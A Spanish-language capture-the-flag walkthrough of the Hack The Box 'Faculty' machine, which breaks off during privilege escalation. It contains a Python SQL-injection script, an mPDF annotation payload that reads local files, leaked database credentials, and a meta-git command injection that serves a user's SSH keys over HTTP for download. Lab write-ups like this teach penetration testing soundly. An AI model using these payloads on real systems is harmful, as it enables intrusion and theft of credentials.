---
title: Hackthebox Writeup Faculty
date: 2022-08-04 17:15:18 pm
categories: [HTB, Writeups]
tags: [HTB, Linux, Medium, Python Scripting, SQLI, XSS, mPDF, meta-git, GDB]

img_path: /assets/img/htb/writeups/faculty/
---

## Overview:

- Database enumeration and bypass login page by **SQL Inyection**
- System users, system files, ssh credentials by **Server Side XSS (Dynamic PDF)**
- Meta plugin _meta-git_ **Remote code execution** (foothold)
- Privileged process debugging with **GDB system function call** (privilege escalation)

* * *

![FacultyLogo](logo.png){: .shadow}

|   OS  |      IP      | Release Date | Difficulty | Points |
|:-----:|:------------:|:------------:|:----------:|:------:|
| Linux | 10.10.11.169 |  02 Jul 2022 |   Medium   |   30   |

* * *

Antes de empezar verificamos que estamos conectado a la **VPN** de HTB y tenemos conexión con la máquina:

```shell
> ping -c1 10.10.11.169
PING 10.10.11.169 (10.10.11.169) 56(84) bytes of data.
64 bytes from 10.10.11.169: icmp_seq=1 ttl=63 time=107 ms
                                          \______________________ Linux Machine
--- 10.10.11.169 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
          \_________________\____________________________________ Successful connection
rtt min/avg/max/mdev = 106.595/106.595/106.595/0.000 ms
```
{: .nolineno}

> Explicación de parámetros:
>
> -c \<count\> : Número de paquetes ICMP que deseamos enviar a la máquina

## Enumeration

* * *

Con `nmap` realizamos un escaneo de tipo **TCP (Transfer Control Protocol)** para descubrir puertos abiertos:

```console
❯ nmap -p- -sS --min-rate 5000 -n -Pn 10.10.11.169
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-04 17:26 -05
Nmap scan report for 10.10.11.169
Host is up (0.11s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
	      \___________________ Secure Shel Protocol
80/tcp open  http
	      \___________________ Hypertext Transfer Protocol
```

> Explicación de parámetros :
{: .prompt-info }

> -p- : Escanear todos los puertos, del 1 al 65,535
>
> -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo
>
> \-\-min-rate \<number\> : Enviar una taza (\<number\>) de paquetes por segundo como mínimo 
>
> -n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS)
>
> -Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneo

Ahora realizamos un escaneo a profundidad de los puertos **22(SSH) - 80(HTTP)**:

```console
❯ nmap -p22,80 -sCV 10.10.11.160 -oN openPortsTCP
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-04 17:32 -05
Nmap scan report for 10.10.11.160
Host is up (0.11s latency).

PORT   STATE  SERVICE VERSION
22/tcp open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)
|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)
|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)
80/tcp closed http
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> Explicación de parámetros :
{: .prompt-info}

> -p \<port\_1,port\_2,\.\.\.> : Indicamos que puertos queremos escanear 
>
> -sCV (Fusión de parámetros -sC -sV) 
>
> -sC : Ejecutar en los puertos scripts por defecto de nmap
> 
> -sV : Activar detección de versiones de los servicios que corren por los puertos
>
> -oN \<file\> : Guardar el output del escaneo en un archivo con formato Nmap

Al empezar por el servicio web **80(HTTP)** y buscar que tecnologías usa, nos damos cuenta que existe una redirección a `faculty.htb`:

> Usando `nc`

```console
❯ nc 10.10.11.169 80 -v
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Connected to 10.10.11.169:80.
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 04 Aug 2022 22:46:25 GMT
Content-Type: text/html
Content-Length: 154
Connection: close
Location: http://faculty.htb <--------- Redirection

<html>
<head><title>302 Found</title></head>
<body>
<center><h1>302 Found</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
```

> Con `curl`

```console
❯ curl -I http://10.10.11.169
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 04 Aug 2022 22:43:11 GMT
Content-Type: text/html
Content-Length: 154
Connection: keep-alive
Location: http://faculty.htb <------- Redirection
```

> Con `whatweb`

```console
❯ whatweb http://10.10.11.169
http://10.10.11.169 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.169], RedirectLocation[http://faculty.htb], Title[302 Found], nginx[1.18.0]
ERROR Opening: http://faculty.htb - no address for faculty.htb <------- Redirection
```

Entonces confirmamos que se aplica **Virtual Hosting** y por ello lo agregamos a nuestro archivo, encargado de la resolución rápida de direcciones IP y nombres de dominio, _/etc/hosts_ : `echo "10.10.11.169 faculty.htb" >> /etc/hosts`

Ahora si procedemos a buscar las tecnologías que corren por detrás usando `whatweb`:

```console
❯ whatweb http://10.10.11.169
http://10.10.11.169 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.169], RedirectLocation[http://faculty.htb], Title[302 Found], nginx[1.18.0]
http://faculty.htb [302 Found] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.169], JQuery, RedirectLocation[login.php], Script[text/javascript], Title[School Faculty Scheduling System], nginx[1.18.0]
http://faculty.htb/login.php [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.169], JQuery, Script[text/javascript], Title[School Faculty Scheduling System], nginx[1.18.0]
```

> Si quieres una opción gráfica puedes usar en tu navegador la extensión [Wappalyzer](https://www.wappalyzer.com/apps/) y ver las tecnologías
{: .prompt-tip}

Observamos que tiene como servidor web una version estable de `Nginx` (version hasta la fecha de hoy: 1.19), como sistema operativo un `Ubuntu`, entre otros. Lo mas interesante es que hay otra redirección a la ruta _login.php_:

> Ingresando con `Firefox`:

![HTTPWeb](http_web.png){: .shadow}


## Foothold

* * *

Nos encontramos en una especie de sistema virtual de una facultad y nos pide ingresar nuestro **Número de Identificación**, al no tener uno empezamos probando una **inyección básica de SQL** `' or 1=1-- -` y logramos entrar como el usuario `Smith Jhon C` pero sin poder hacer mucho

Para observar de una mejor manera la respuesta a este panel de identificación y la inyección SQL, procedemos a interceptar la petición con `burpsuite`

Ingresando como input una comilla simple `'` logramos generar un error y la ruta absoluta de un archivo **PHP**:

![BURPLogin](burp_login.png){: .shadow}

Ahora que obtenemos una respuesta de error podemos listar las bases de datos que existan y sus respectivas tablas y columnas:

> Primero tenemos que hallar el número de columnas de la tabla actual en la que se están seleccionando los datos

![SQLI](sqli_order_by.png){: .shadow}

La palabra clave o comando `order by` ordena el conjunto de resultados de la consulta (asc. o desc.) y nos sirve para hallar el número de columnas. Veamos un ejemplo:

```
MariaDB [test_db]> select * from Accounts;
+----------+----------+-------------------+
| Username | Password | Email             |
+----------+----------+-------------------+
| admin    | HxZsO9AR | admin@site.com    |
| staff    | ihKdNTU4 | staff@site.com    |
| user     | Iwsi7Ks8 | usr@othersite.com |
+----------+----------+-------------------+
MariaDB [test_db]> select * from Accounts where Username = '' order by 1;
Empty set (0.000 sec)

MariaDB [test_db]> select * from Accounts where Username = '' order by 2;
Empty set (0.001 sec)

MariaDB [test_db]> select * from Accounts where Username = '' order by 3;
Empty set (0.001 sec)

MariaDB [test_db]> select * from Accounts where Username = '' order by 4;
ERROR 1054 (42S22): Unknown column '4' in 'order clause' <------------------ Number of columns = 3 (4 - 1)
```

> Tambien puede usarse la palabra clave `group by`, ambos funcionan igual para este propósito
{: .prompt-info}

> Ahora tenemos que hacer una selección con el número de columnas de la tabla para poder usar cualquiera de sus campos

![SQLI](sqli_union_select.png){: .shadow}

Para ello usamos la palabra clave `union` que nos permite unir varias selecciones de distintas tablas en una sola. Veamos el ejemplo:

```
MariaDB [test_db]> select * from Accounts where Username = '' union select 1,2,3;
+----------+----------+-------+
| Username | Password | Email |
+----------+----------+-------+
| 1        | 2        | 3     |
+----------+----------+-------+
```

> Ahora que ya tenemos acceso a los campos, usamos la función `group_concat()` para poder extraer los nombres de bases de datos, columnas, etc

![SQLI](sqli_group_concat.png){: .shadow}

La función `group_concat()` nos ayuda a concatenar datos de múltiples filas en un solo campo. Veamos un ejemplo:

```
MariaDB [test_db]> select * from Accounts where Username = '' union select 1,2,group_concat(0x7c, user(), 0x7c, database(), 0x7c);
+----------+----------+--------------------------+
| Username | Password | Email                    |
+----------+----------+--------------------------+
| 1        | 2        | |root@localhost|test_db| |
+----------+----------+--------------------------+
```

Finalmente ahora podemos extraer diversa información como:

```console
--Database names
' union select 1,2,group_concat(0x7c,schema_name,0x7c) from information_schema.schemata

--Tables of a database
' union select 1,2,3,group_concat(0x7c,table_name,0x7C) from information_schema.tables where table_schema=[database]

--Column names
' union select 1,2,3,group_concat(0x7c,column_name,0x7C) from information_schema.columns where table_name=[table name]
```

> Esta y más información lo encuentras en [Hacktricks](https://book.hacktricks.xyz/pentesting-web/sql-injection#exploiting-union-based)
{: .prompt-info}

El único problema era que teniamos que ir probando cada query en la página _login.php_ y es tedioso, por ello hice un script en `python` para automatizar gran proceso:

```python
import signal, sys, argparse, requests, subprocess, base64

# debugging
import pdb

# ctrl+C

def signal_handler():
    print("[-] Interruption"); sys.exit()

signal.signal(signal.SIGINT, signal_handler)

# global variables

target_url = 'http://faculty.htb'

# arguments

parser = argparse.ArgumentParser(description='SQL Inyection')
parser.add_argument('-d', '--database', type=str, required=False, help='Select database')
parser.add_argument('-t', '--table', type=str, required=False, help='Select table')
parser.add_argument('-c', '--column', type=str, required=False, help='Select column')
parser.add_argument('-q', '--query', type=str, required=False, help='One word query (g.e version())')

args = parser.parse_args()

# query modes

def get_databases():
    return """' union select 1,2,3,4,5,6,7,8,9,group_concat(0x7c, schema_name, 0x7c) from information_schema.schemata-- -"""

def get_tables(database):
    return """' union select 1,2,3,4,5,6,7,8,9,group_concat(0x7c, table_name, 0x7c) from information_schema.tables where table_schema = "{}"-- -""".format(database)

def get_columns(table):
    return """' union select 1,2,3,4,5,6,7,8,9,group_concat(0x7c, column_name, 0x7c) from information_schema.columns where table_name = "{}"-- -""".format(table)

def get_fields(column, table):
    return """' union select 1,2,3,4,5,6,7,8,9,group_concat(0x7c, {}, 0x7c) from {}-- -""".format(column, table)
 
def get_info(command):
    return """' union select 1,2,3,4,5,6,7,8,9,group_concat(0x7c, {}, 0x7c)-- -""".format(command)
    

# options

def options():
    try:
        if len(sys.argv) == 1:
            return get_databases()
        elif args.database and args.table and args.column:
            return get_fields(args.column, args.table)
        elif args.database and args.table:
            return get_columns(args.table)
        elif args.database:
            return get_tables(args.database)
        elif args.query:
            return get_info(args.query)
    except Exception as e:
        print(e)

# request

def inyection():
    # create session
    s = requests.Session()
    headers = {'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}
    
    # set option
    inyection = options()

    # inyection
    data = dict(id_no=inyection)
    target = target_url + '/admin/ajax.php?action=login_faculty'
    r = s.post(target, headers=headers, data=data)
    target = target_url + '/index.php'
    r = s.get(target, cookies=r.cookies.get_dict()) 
    content = r.text
    
    # encode b64
    msg_b = content.encode('ascii')
    base64_b = base64.b64encode(msg_b)
    base64_m = base64_b.decode('ascii')
    
    # filter content
    command = f"""echo {base64_m} | base64 -d""" + """ | grep -E "<a" | head -n 1 | awk -F'>' '{print $2}' | awk '{print $1}'"""
    output = subprocess.run(command, shell=True, capture_output=True, text=True)
    print()
    print(output.stdout)
    
    

if __name__ == '__main__':
    inyection()
```

> Puedes encontrar el script en mi repositorio [https://github.com/E1P0TR0](https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/Auto-tool_Faculty/sql_inyection.py)
{: .prompt-info}

Después de enumerar las diversas tablas solo encontramos un **hash** del usuario **Admin** que no podremos crackear, a pesar de eso me gustó el scripting de la inyección a manera de práctica

Algo que si nos puede ser útil es la ruta que encontramos al encontrar el error de la inyección: `/var/www/scheduling/admin/admin_class.php`

Como usuarios de `Linux` sabemos que al montar un servidor web todos los archivos o documentos serán almacenados en la ruta _/var/www/html_ y podemos tener múltiples sitios web con una misma dirección IP, ya sea con `apache` (virtual hosts) o `nginx` (server blocks), y sus diferentes directorios de la web

Con lo anterior llegamos a la conclusión que _/var/www/scheduling_ (nombre que tiene relación con la web) sea un **server block** de `nginx` y _/admin_ una posible ruta con sus respectivos archivos. Así que ingresamos a la ruta _http://faculty.htb/admin_ y nos redirigimos a otro panel _login.php_:

![HTTPWeb](http_admin_login.png){: .shadow}

> También podemos realizar **Fuzzing de directorios** con `gobuster dir` para encontrar dicha ruta
{: .prompt-info}

Ejecutando es script anterior encontramos que en la base de datos existía una tabla **users** y con solo un único usuario **admin**, pero no sin poder crackear la contraseña:

```console
❯ python3 ../scripts/sql_inyection.py -d scheduling_db -t users

|id|,|name|,|password|,|type|,|username|

❯ python3 ../scripts/sql_inyection.py -d scheduling_db -t users -c username

|admin|

❯ python3 ../scripts/sql_inyection.py -d scheduling_db -t users -c password

|1fecbe762af147c1176a0fc2c722a345|
```

A pesar de eso, es probable que este panel de login también sea vulnerable a  **SQL Inyection**, ya que ambas forman parte de la misma web y probablemente apliquen las mismas prácticas para la validación de datos en la consulta a su base de datos

Estamos en lo correcto y logramos entrar como el usuario que antes habiamos validado en la table **users**:

![HTTPWeb](http_home_page.png){: .shadow}

Ya dentro encontramos la relación del panel de la izquierda con las tablas de la base de datos **scheduling_db** que vimos anteriormente

Después de toquetear la página, encontramos que todos los campos de entrada para el usuario son vulnerables a **XSS (Cross Site Scripting)**, pero no conseguimos explotarla del todo:

![HTTPWeb](http_xss_vuln.png){: .shadow}

Lo que llama la atención es que en la mayoría de secciones podemos convertir la tabla de datos en `pdf` y con ello ver información interesante:

> Al convertir se nos abre una nueva pestaña con una ruta interesante: _http://faculty.htb/mpdf/tmp/OKi3s9CQdwfjGag64Ju5ZO0NpF.pdf_

> También al abrir las herramientas de desarrollador observamos el mensaje en consola: _PDF da3749fcbe722bed51f217ce14055d41 [1.4 mPDF 6.0 / -] (PDF.js: 2.12.70)_

Además podemos ver su código que lo ejecuta en el archivo `viewer.js`

```javascript
//...

async _initializeMetadata(pdfDocument) {
    const {
      info,
      metadata,
      contentDispositionFilename,
      contentLength
    } = await pdfDocument.getMetadata();

    if (pdfDocument !== this.pdfDocument) {
      return;
    }

    this.documentInfo = info;
    this.metadata = metadata;
    this._contentDispositionFilename ??= contentDispositionFilename;
    this._contentLength ??= contentLength;
    console.log(`PDF ${pdfDocument.fingerprints[0]} [${info.PDFFormatVersion} ` + `${(info.Producer || "-").trim()} / ${(info.Creator || "-").trim()}] ` + `(PDF.js: ${_pdfjsLib.version || "-"})`); // This!

//...
}
```

> Y finalmente al descargar el pdf y abrirlo, en sus propiedades podemos ver la herramienta que se encargaría de generar el archivo:

![mpdf](mpdf_version.png){: .shadow}

Buscando en internet encontramos que **mpdf** es una librería en **PHP** que permite generar archivos **pdf** usando **html**, además que su versión hasta la fecha es `mpdf 8.1.0` y la que usa es servidor la `mpdf 6.0`, por lo cuál está muy desactualizada y es probable que sea vulnerable

Encontramos en la página [Hacktricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf) una posible brecha de **Server Side XSS**, lo cúal ya descubrimos anteriormente que la web era vulnerable a **XSS (Cross Site Scripting)**

Depués de intentar con varios tags para **leer archivos locales**, encontramos que `<annotation>` es vulnerable, pero que nos permite este tag?

![AnnotationTAG](annotation_tag.png){: .shadow}

Como su mismo nombre lo dice nos permite realizar anotaciones en nuestro documento pdf, como las nostas **Post-it** que las personas usan

Ahora analizemos los parámetros que usamos para la inyección:

```html
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
```

> Parameters
>
> file : Ruta del archivo para adjuntar en el pdf (importante)
>
> content : Texto emergente al pasar el cursor por el documento (importante para poder luego descargar el archivo)
>
> icon : Apariencia del marcador de anotación (no necesario)
>
> tittle : Agregar un titulo a la nota (solo necesario para mejor visualización)
>
> pos-x : Posición de la nota (tener en cuenta que se encuentre en el limite del tamaño de tu archivo para poder visualizarlo, de igual manera estará adjunto al documento)

> En cualquier caso no puedas ver el archivo en la web, ten en cuenta que ya es parte del archivo y puedes extraerlo con la herramienta [pdftk](https://etutorials.org/Linux+systems/pdf+hacks/Chapter+1.+Consuming+PDF/Hack+12+Unpack+PDF+Attachments+Even+Without+Acrobat/) 
{: .prompt-tip}

```console
❯ apt install pdftk

❯ pdftk OKbvFO0p8W9ud7qtnTzHJsfZhr.pdf unpack_files

❯ ls
 OKbvFO0p8W9ud7qtnTzHJsfZhr.pdf   passwd
```

> Más información del tag `<annotation>` [https://mpdf.github.io](https://mpdf.github.io/reference/html-control-tags/annotation.html)
{: .prompt-info}

> Aquí puedes encontrar el repositorio de la vulnerabilidad exacta [https://github.com/mpdf](https://github.com/mpdf/mpdf/issues/356)
{: .prompt-tip}

Ahora que podemos leer archivos del sistema y tenemos el archivo `/etc/passwd`, podemos ver los usuarios existentes:

```console
❯ cat passwd | grep bash
root:x:0:0:root:/root:/bin/bash
gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
developer:x:1001:1002:,,,:/home/developer:/bin/bash
```

Intentamos leer llaves privadas **RSA** pero no conseguimos nada. Entonces recordamos el archivo que encontramos antes al generar el error en la inyección **SQL** (_/var/www/scheduling/admin/admin_class.php_), lo extraemos y vemos su contenido:

```php
<?php
session_start();
ini_set('display_errors', 1);
Class Action {
        private $db;

        public function __construct() {
                ob_start();
        include 'db_connect.php'; // File in the same directory
    
    $this->db = $conn;
        }
        function __destruct() {
            $this->db->close();
            ob_end_flush();
        }

//...
```

> Encontramos las funciones y queries vulnerables a la **Inyección SQL** y nos demos cuenta que el problema es el **mal uso de concatenación de cadenas** ("." para php)
{: .prompt-warning}

Lo que sí de ve interesante es que incluyen el archivo `db_connect.php`, que por su nombre podemos encontrar cosas interesantes de la base de datos, así que de la misma manera descargamos el archivo:

```php
<?php 

$conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die("Could not connect to mysql".mysqli_error($con)); // Credentials!
```

Logramos encontrar unas credenciales, pero en nuestro escaneo de puertos la máquina no tenia el puerto por defecto de Mysql **3306** así que no podemos conectarnos. Pero ya que son credenciales podemos rehusarlas e ingresar como los usuarios disponibles del sistema que vimos en el archivo _/etc/passwd_ y tienen una bash: **root, gbyolo, developer**

Al final logramos entrar como el usuario `gbyolo` pero no tenemos permisos aún para ver la flag:

```console
❯ ssh gbyolo@10.10.11.169
gbyolo@10.10.11.169's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Aug  5 20:20:15 CEST 2022

  System load:  0.0               Processes:             226
  Usage of /:   74.9% of 4.67GB   Users logged in:       0
  Memory usage: 35%               IPv4 address for eth0: 10.10.11.169
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


You have mail.
Last login: Fri Aug  5 20:19:01 2022 from 10.10.14.76
gbyolo@faculty:~$ whoami
gbyolo
gbyolo@faculty:~$ find / -name user.txt 2>/dev/null | ls -l
total 0
```

Empezamos una enumeración básica del sistema y encontramos en la ruta `/var/mail` un mensaje del usuario `developer` para `gbyolo` que nos dice que ahora podemos administrar los repositorios **git** de la facultad

```console
gbyolo@faculty:/$ cat /var/mail/gbyolo 
From developer@faculty.htb  Tue Nov 10 15:03:02 2020
Return-Path: <developer@faculty.htb>
X-Original-To: gbyolo@faculty.htb
Delivered-To: gbyolo@faculty.htb
Received: by faculty.htb (Postfix, from userid 1001)
        id 0399E26125A; Tue, 10 Nov 2020 15:03:02 +0100 (CET)
Subject: Faculty group
To: <gbyolo@faculty.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20201110140302.0399E26125A@faculty.htb>
Date: Tue, 10 Nov 2020 15:03:02 +0100 (CET)
From: developer@faculty.htb
X-IMAPbase: 1605016995 2
Status: O
X-UID: 1

Hi gbyolo, you can now manage git repositories belonging to the faculty group. Please check and if you have troubles just let me know!\ndeveloper@faculty.htb
```

Para esto podemos ver que aplicaciones o comandos podemos ejecutar y que privilegios tenemos, para ello usamos el comando `sudo -l` e ingresamos nuestra contraseña (la de la conexión ssh):

```console
gbyolo@faculty:~$ sudo -l
[sudo] password for gbyolo: 
Matching Defaults entries for gbyolo on faculty:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gbyolo may run the following commands on faculty:
    (developer) /usr/local/bin/meta-git
```

Encontramos que podemos ejecutar el comando `meta-git` como el usuario `developer`, por el nombre podemos decir que es un control de versiones al igual que `git`

Investigando primero encontramos que `meta` es una herramienta para administrar sistemas y bibliotecas de múltiples proyectos y que `meta-git` es un plugin que permite administrar estos repositorios meta

> Por si necesitas mas información sobre qué es [meta](https://github.com/mateodelnorte/meta) y [meta-git](https://www.npmjs.com/package/meta-git)
{: .prompt-info}

Executando el programa nos muestra todas las opciones que tenemos disponibles:

```console
gbyolo@faculty:~$ /usr/local/bin/meta-git
Usage: meta-git [options] [command]

Options:
  -h, --help  output usage information

Commands:
  add         Add file contents to the index
  branch      List, create, or delete branches
  checkout    Switch branches or restore working tree files
  clean       Remove untracked files from the working tree
  clone       Clone meta and child repositories into new directories
  commit      Record changes to the repository
  diff        Show changes between commits, commit and working tree, etc
  fetch       Download objects and refs from another repository
  merge       Join two or more development histories together
  pull        Fetch from and integrate with another repository or a local branch
  push        Update remote refs along with associated objects
  remote      Manage set of tracked repositories
  status      Show the working tree status
  tag         Create, list, delete or verify a tag object signed with GPG
  update      Clone any repos that exist in your .meta file but aren't cloned locally
  help [cmd]  display help for [cmd]
```

A pesar que no podemos ver la versión del programa en el panel de ayuda, ya que es una aplicación hecha en javascript y necesita instalarse con `npm` (sistema de gestión de paquetes). Entonces al momento de instalar este paquete/plugin se crea un directorio _/node-modules_ en la carpeta raíz de nuestro proyecto _/usr/local/lib/node_modules/meta-git_ y en está carpeta encontramos el archivo _package.json_ donde se almacenan todos los nombres y versiones de los paquetes que depende, con ello encontramos las version de `meta-git`:

```console
gbyolo@faculty:/$ find / -name meta-git 2>/dev/null                                                                                                                  [65/65]
/usr/local/lib/node_modules/meta-git                                                  
/usr/local/lib/node_modules/meta-git/bin/meta-git                                     
/usr/local/bin/meta-git                  
gbyolo@faculty:/$ cd /usr/local/lib/node_modules/meta-git
gbyolo@faculty:/usr/local/lib/node_modules/meta-git$ ls                               
README.md  __tests__  bin  commitlint.config.js  index.js  jest.json  lib  node_modules  package.json
gbyolo@faculty:/usr/local/lib/node_modules/meta-git$ cat package.json     
{                                                                                     
  "_from": "meta-git@1.1.2",
  "_id": "meta-git@1.1.2",
  "_inBundle": false,                                                                 
  "_integrity": "sha512-HMoLDeIgVBAl8/neDKX3RfRV4CAiRrrMxqCGmo1eyRS33cxYqIWVr9RS87m5mYnVgLHN8JmsahkpOdbKr3M4Ew==",
  "_location": "/meta-git",                                                           
  "_phantomChildren": {},
  "_requested": {              
    "type": "version",                                                                
    "registry": true,                                                                 
    "raw": "meta-git@1.1.2",                                                          
    "name": "meta-git",                                                               
    "escapedName": "meta-git",                                                        
    "rawSpec": "1.1.2",                                                               
    "saveSpec": null,                    
    "fetchSpec": "1.1.2"                                                              

  //...

  },
  "version": "1.1.2" <------- Here!
}
```

Con la versión correcta encontramos una vulnerabilidad:

![METAGit](meta_git_vuln.png){: .shadow}

> Reporte de la vulnerabilidad [https://hackerone.com/reports/728040](https://hackerone.com/reports/728040)
{: .prompt-info}

En resumen, lo que ocurre es que al ejecutar el comando `meta-git clone <repository_name>` el input del usuario **\<repository_name\>** se asigna dentro de una cadena sin sanitizar que luego se ejecuta como un comando:

> Parte del código del problema

```javascript
//...

exec(
    {
      cmd: `git clone ${meta.projects[name]} ${name}`, <--------- Problem!
      displayDir: path.resolve(name),
    },
    next
);
//...
```

> Aquí encuentras el código completo [https://github.com/mateodelnorte/meta-git/blob/master/lib/metaGitUpdate.js#L49](https://github.com/mateodelnorte/meta-git/blob/master/lib/metaGitUpdate.js#L49)
{: .prompt-info}

Ahora solo queda explotar la vulnerabilidad. Primero tengamos en cuenta que tenemos que ejecutar `meta-git` como el usuario `developer`, para ello usamos el comando `sudo -u <user>` junto a `/usr/local/bin/meta-git clone '<user_input>'`, donde nuestro **\<user_input\>** será cualquier nombre ya que no tenemos un repositorio actual y haremos uso de el operador lógico `||` el cúal funciona como un **or** y al momento que falle la llamada al repositorio inexistente pasará a ejecutar el comando que insertemos luego:

```console
gbyolo@faculty:/$ sudo -u developer /usr/local/bin/meta-git clone 'any text || whoami'
meta git cloning into 'any text || whoami' at any text || whoami

any text || whoami:
fatal: repository 'any' does not exist
whoami: extra operand ‘any’
Try 'whoami --help' for more information.
developer  <---------------------------------------- Remote Code Execution
any text || whoami ✓
(node:38044) UnhandledPromiseRejectionWarning: Error: ENOENT: no such file or directory, chdir '/any text || whoami'
    at process.chdir (internal/process/main_thread_only.js:31:12)
    at exec (/usr/local/lib/node_modules/meta-git/bin/meta-git-clone:27:11)
    at execPromise.then.catch.errorMessage (/usr/local/lib/node_modules/meta-git/node_modules/meta-exec/index.js:104:22)
    at process._tickCallback (internal/process/next_tick.js:68:7)
    at Function.Module.runMain (internal/modules/cjs/loader.js:834:11)
    at startup (internal/bootstrap/node.js:283:19)
    at bootstrapNodeJSCore (internal/bootstrap/node.js:623:3)
(node:38044) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). (rejection id: 1)
(node:38044) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.
```

Solo queda obtener la llave privada `id_rsa` del usuario `developer` para entrar por **SSH** y conseguir la flag:

```console
gbyolo@faculty:/$ sudo -u developer /usr/local/bin/meta-git clone 'any text || /usr/bin/python3 -m http.server -d /home/developer/.ssh 1234 && foo'
meta git cloning into 'any text || /usr/bin/python3 -m http.server -d /home/developer/.ssh 1234 && foo' at .ssh 1234 && foo

.ssh 1234 && foo:
fatal: repository 'any' does not exist
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.14.76 - - [06/Aug/2022 01:28:22] "GET /id_rsa HTTP/1.1" 200 -
                    
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ wget -q http://10.10.11.169:1234/id_rsa
❯ chmod 600 id_rsa
❯ ssh -i id_rsa developer@10.10.11.169
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

...

Last login: Sat Aug  6 01:28:59 2022 from 10.10.14.76
developer@faculty:~$ find / -name user.txt 2>/dev/null | xargs ls -l
-rw-r----- 1 root developer 33 Aug  5 06:54 /home/developer/user.txt
```

> Tienes agregar al final del comando una coma `;` ó (`||` y `&&` seguidos por cualquier expresión), todo con el fin que valide el comando completo y no ocurran errores
{: .prompt-tip}

## Privilege Escalation

* * *

Como el usuario `developer` somos parte del grupo `debug`, entonces buscamos archivos que formen parte de este grupo y encontramos la aplicación/binario `gdb`:

```console
developer@faculty:~$ find / -group debug 2>/dev/null | xargs ls -l
-rwxr-x--- 1 root debug 8440200 Dec  8  2021 /usr/bin/gdb
```

Vemos que podemos usar el depurador `gdb`:

![GDB](gdb_def.png){: .shadow}

También con `gdb` podemos enlazarnos a un cierto proceso con `gdb -p <process_pid>`, examinar su código y también usar las librerías de los programas que son parte del proceso. Además si ese proceso es ejecutado como un **usuario privilegiado**, está claro que tendremos sus privilegios

> Primero debemos encontrar procesos que ejecute el usuario `root`

```console
developer@faculty:~$ ps aux | grep root
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
root         615  0.0  0.0      0     0 ?        I<   Aug05   0:00 [kaluad]
root         616  0.0  0.0      0     0 ?        I<   Aug05   0:00 [kmpath_rdacd]
root         617  0.0  0.0      0     0 ?        I<   Aug05   0:00 [kmpathd]
root         618  0.0  0.0      0     0 ?        I<   Aug05   0:00 [kmpath_handlerd]
root         619  0.0  0.8 214604 17952 ?        SLsl Aug05   0:07 /sbin/multipathd -d -s
root         664  0.0  0.5  46324 10760 ?        Ss   Aug05   0:00 /usr/bin/VGAuthService
root         670  0.1  0.4 310256  8136 ?        Ssl  Aug05   1:19 /usr/bin/vmtoolsd
root         671  0.0  0.2  99896  5892 ?        Ssl  Aug05   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root         695  0.0  0.4 238080  9176 ?        Ssl  Aug05   0:01 /usr/lib/accountsservice/accounts-daemon
root         723  0.0  0.1  81956  3672 ?        Ssl  Aug05   0:03 /usr/sbin/irqbalance --foreground
